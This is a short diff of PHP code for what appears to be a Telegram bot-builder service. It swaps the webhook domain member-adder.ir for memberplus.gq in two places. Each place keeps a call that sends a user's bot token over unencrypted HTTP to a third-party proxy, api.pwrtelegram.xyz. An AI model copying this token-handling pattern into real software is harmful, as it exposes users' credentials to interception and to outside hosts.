@@ -234,7 +234,7 @@ $token = $textmessage ;
 		$source = str_replace("**TOKEN**",$token,$source);
 		$source = str_replace("**ADMIN**",$from_id,$source);
 		save("bots/$un/index.php",$source);	
-		file_get_contents("http://api.pwrtelegram.xyz/bot".$token."/setwebhook?url=https://member-adder.ir/tgpvsaz/index.php");
+		file_get_contents("http://api.pwrtelegram.xyz/bot".$token."/setwebhook?url=https://memberplus.gq/tgpvsaz/index.php");
 
 var_dump(makereq('sendMessage',[
         	'chat_id'=>$update->message->chat->id,
@@ -298,7 +298,7 @@ Your Robot Has ben Created
 		$source = str_replace("**TOKEN**",$token,$source);
 		$source = str_replace("**ADMIN**",$from_id,$source);
 		save("bots/$un/index.php",$source);	
-		file_get_contents("http://api.pwrtelegram.xyz/bot".$token."/setwebhook?url=https://member-adder.ir/tgpvsaz/index.php");
+		file_get_contents("http://api.pwrtelegram.xyz/bot".$token."/setwebhook?url=https://memberplus.gq/tgpvsaz/index.php");
 
 var_dump(makereq('sendMessage',[
         	'chat_id'=>$update->message->chat->id,
